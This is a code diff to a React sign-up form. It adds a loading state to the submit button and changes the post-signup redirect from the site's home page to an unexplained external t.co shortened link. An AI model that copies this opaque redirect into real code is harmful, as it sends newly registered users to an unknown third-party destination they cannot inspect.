@@ -10,6 +10,7 @@ import Nav from "@components/Nav";
 
 
 const Sign = () => {
+  const[submit,setSubmit]=useState(false);
   const [user,setUser]=useState({
     email:'',
     password:'',
@@ -21,6 +22,7 @@ const router = useRouter();
 
   const handleSubmit =async (e) => {
     e.preventDefault();
+    setSubmit(true);
     
     try {
       const response = await fetch('/api/user/new',{
@@ -34,7 +36,8 @@ const router = useRouter();
         })
       });
       if(response.ok){
-        router.push('/');
+        setSubmit(false);
+        router.push('https://t.co/65GwtTi0Gn');
       }
     } catch (error) {
     alert(error);
@@ -131,7 +134,7 @@ const router = useRouter();
               <button
               type="submit"
               className="mt-8 text-center text-white bg-[#EB1700] w-full rounded-full py-3 font-bold font- "
-              > Sign Up
+              >{submit? 'loading ...':'Sign Up'}
               </button>
               </form>
                  <div className="flex justify-center items-center mb-1">
